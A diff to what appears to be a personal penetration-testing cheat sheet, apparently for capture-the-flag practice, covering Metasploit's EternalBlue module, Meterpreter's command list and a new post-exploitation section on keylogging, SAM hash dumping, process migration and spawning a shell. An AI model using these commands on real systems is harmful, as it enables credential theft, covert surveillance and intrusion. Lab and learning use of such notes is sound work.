@@ -111,7 +111,7 @@ C:\Windows\system32> tasklist /m /fi "pid eq 1304"                              
 # msfvenom --list payloads | grep meterpreter
 msf6> exploit(windows/smb/ms17_010_eternalblue) > show payloads                  <-- show payloads for exploit
 
-Meterpreter Commands:
+Meterpreter Commands: meterpreter> "help"
     Core commands
             background: Backgrounds the current session
             exit: Terminate the Meterpreter session
@@ -165,6 +165,23 @@ Meterpreter Commands:
             webcam_stream: Plays a video stream from the specified webcam
             getsystem: Attempts to elevate your privilege to that of local system
             hashdump: Dumps the contents of the SAM database
+
+POST Exploitation 
+-----------------
+meterpreter>    getuid                                              <-- display the user with which Meterpreter is currently running
+meterpreter>    migrate 716                                         <-- migrate to a more stable process (view process's w/ ps cmd)
+meterpreter>    "keyscan_start |  keyscan_stop, | keyscan_dump"     <-- make Meterpreter act like a keylogger
+meterpreter>    hashdump                                            <-- dump SAM database
+meterpreter>    search -f flag2.txt                                 <-- search is avail. in meterpreter sessions
+meterpreter>    shell                                               <-- launch a regr cmd-line shell on the target. CTRL+Z will go back to the Meterpreter shell
+
+
+
+
+
+
+
+
 
 
 
